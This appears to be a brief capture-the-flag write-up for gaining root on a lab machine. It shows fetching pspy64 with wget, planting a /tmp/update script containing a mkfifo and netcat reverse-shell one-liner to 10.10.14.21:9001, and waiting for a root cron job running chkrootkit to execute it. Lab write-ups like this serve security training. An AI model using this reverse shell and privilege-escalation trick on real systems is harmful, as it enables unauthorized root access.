# Getting Root
```bash
wget 10.10.14.21/pspy64 
```

```bash
./pspy64
```
![[Pasted image 20211110000522.png]]



![[Pasted image 20211110000331.png]]
Content of 33899.txt
![[Pasted image 20211110000234.png]]

Create file update on /tmp

Content of update

```bash
#!/bin/bash

rm /tmp/2;mkfifo /tmp/2;cat /tmp/2|/bin/sh -i 2>&1|nc 10.10.14.21 9001 >/tmp/2
```

```bash
$ chmod +x update
```

Wait one minute to Cron call the process chkrootkit

![[Pasted image 20211110000836.png]]